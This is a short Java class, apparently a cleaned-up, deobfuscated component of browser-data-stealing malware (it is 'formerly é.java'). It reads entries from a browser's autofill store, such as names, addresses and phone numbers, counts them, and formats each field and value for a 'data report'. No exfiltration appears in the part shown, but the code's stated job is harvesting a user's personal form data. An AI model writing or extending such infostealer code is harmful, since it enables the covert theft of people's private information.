import java.sql.ResultSet;

/**
 * Cleaned AutofillMapper (formerly é.java)
 * Extracts browser autofill data (form fields like names, addresses, phones).
 */
public class AutofillMapper implements DataMapper {
    private final BrowserStats stats;

    public AutofillMapper(BrowserStats stats) {
        this.stats = stats;
    }

    @Override
    public String mapRow(ResultSet rs) throws Exception {
        synchronized (stats) {
            this.stats.totalAutofillEntries++;
        }

        String fieldName = rs.getString("name");
        String fieldValue = rs.getString("value");

        if (fieldValue == null || fieldValue.isBlank()) {
            return "";
        }

        // Simple formatting for the data report
        return "\nField: " + fieldName + " | Value: " + fieldValue;
    }
}
